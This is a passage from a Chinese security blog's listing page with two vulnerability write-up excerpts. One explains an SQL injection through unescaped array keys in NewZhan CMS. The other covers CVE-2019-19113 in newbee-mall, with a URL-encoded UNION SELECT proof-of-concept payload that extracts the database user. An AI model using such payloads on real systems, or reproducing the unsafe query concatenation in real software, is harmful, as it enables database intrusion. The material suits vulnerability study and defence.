<p>NewZhan CMS 个人版 2.6.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>数据库操作函数对传入的数组仅仅对value进行了转义处理，并没有把key考虑在内，前台控制器可以通过提交POST<br>控制key进行注入。 db_mysql.class.php</p>
<pre><code>public function update($key, $data) &#123;

list($table, $keyarr, $keystr) = $this-&gt;key2arr($key);

$s = $this-&gt;arr2sql($data);

return $this-&gt;query(&quot;UPDATE &#123;$this-&gt;tablepre&#125;$table SET $s WHERE $keystr LIMIT 1&quot;, $this-&gt;wlink);

&#125;

private function key2arr($key) &#123;

$arr = explode(&#39;-&#39;, $key);


if(empty($arr[0])) &#123;

throw new Exception(&#39;table name is empty.&#39;);

&#125;


$table = $arr[0];

$keyarr = array();

$keystr = &#39;&#39;;

$len = count($arr);

for($i = 1; $i &lt; $len; $i = $i + 2) &#123;

if(isset($arr[$i + 1])) &#123;

$v = $arr[$i + 1];

$keyarr[$arr[$i]] = is_numeric($v) ? intval($v) : $v;
// 因为 mongodb 区分数字和字符串


$keystr .= ($keystr ? &#39; AND &#39; : &#39;&#39;).$arr[$i].&quot;=&#39;&quot;.addslashes($v).&quot;&#39;&quot;;

&#125; else &#123;

$keyarr[$arr[$i]] = NULL;

&#125;

&#125;


if(empty($keystr)) &#123;

throw new Exception(&#39;keystr name is empty.&#39;);

&#125;

return array($table, $keyarr, $keystr);

&#125;
</code></pre>
<p>审计发现前台商品管理控制器有$POST 数据传入update($data)可以触发SQL<br>注入</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/NewZhan%20CMS/NewZhan%20CMS%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/NewZhan%20CMS/NewZhan%20CMS%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsxa00c2y8v1ex20c6ae" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Newbee-mall/CVE-2019-19113）Newbee-mall新蜂商城sql注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Newbee-mall/CVE-2019-19113%EF%BC%89Newbee-mall%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8Esql%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2022-07-08T06:26:00.080Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-19113）新蜂商城sql注入"><a href="#（CVE-2019-19113）新蜂商城sql注入" class="headerlink" title="（CVE-2019-19113）新蜂商城sql注入"></a>（CVE-2019-19113）新蜂商城sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>\src\main\resources\mapper\NewBeeMallGoodsMapper.xml</p>
<pre><code>  &lt;select id=&quot;findNewBeeMallGoodsListBySearch&quot; parameterType=&quot;Map&quot; resultMap=&quot;BaseResultMap&quot;&gt;
        select
        &lt;include refid=&quot;Base_Column_List&quot;/&gt;
        from tb_newbee_mall_goods_info
        &lt;where&gt;
            &lt;if test=&quot;keyword!=null and keyword!=&#39;&#39;&quot;&gt;
                and (goods_name like CONCAT(&#39;%&#39;,&#39;$&#123;keyword&#125;&#39;,&#39;%&#39;) or goods_intro like CONCAT(&#39;%&#39;,&#39;$&#123;keyword&#125;&#39;,&#39;%&#39;))
            &lt;/if&gt;
            &lt;if test=&quot;goodsCategoryId!=null and goodsCategoryId!=&#39;&#39;&quot;&gt;
                and goods_category_id = #&#123;goodsCategoryId&#125;
            &lt;/if&gt;
        &lt;/where&gt;
        &lt;if test=&quot;orderBy!=null and orderBy!=&#39;&#39;&quot;&gt;
            &lt;choose&gt;
                &lt;when test=&quot;orderBy == &#39;new&#39;&quot;&gt;
                    &lt;!-- 按照发布时间倒序排列 --&gt;
                    order by goods_id desc
                &lt;/when&gt;
                &lt;when test=&quot;orderBy == &#39;price&#39;&quot;&gt;
                    &lt;!-- 按照售价从小到大排列 --&gt;
                    order by selling_price asc
                &lt;/when&gt;
                &lt;otherwise&gt;
                    &lt;!-- 默认按照库存数量从大到小排列 --&gt;
                    order by stock_num desc
                &lt;/otherwise&gt;
            &lt;/choose&gt;
        &lt;/if&gt;
        &lt;if test=&quot;start!=null and limit!=null&quot;&gt;
            limit #&#123;start&#125;,#&#123;limit&#125;
        &lt;/if&gt;
    &lt;/select&gt;
</code></pre>
<p>如果使用$ {keyword}拼接sql语句，则存在SQL注入的风险</p>
<p>poc：</p>
<pre><code>http://0-sec.org:28089/search?goodsCategoryId=&amp;keyword=%5C%25%27%29%29%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%43%4F%4E%43%41%54%28%30%78%37%31%37%36%36%32%37%38%37%31%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%43%55%52%52%45%4E%54%5F%55%53%45%52%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%37%31%36%32%37%38%36%62%37%31%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%23&amp;orderBy=defaul
</code></pre>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Newbee-mall/CVE-2019-19113%EF%BC%89Newbee-mall%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8Esql%E6%B3%A8%E5%85%A5/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Newbee-mall/CVE-2019-19113%EF%BC%89Newbee-mall%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8Esql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qssj00c1y8v15wh03upu" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/57/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/56/">56</a><a class="page-number" href="/page/57/">57</a><span class="page-number current">58</span><a class="page-number" href="/page/59/">59</a><a class="page-number" href="/page/60/">60</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/59/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>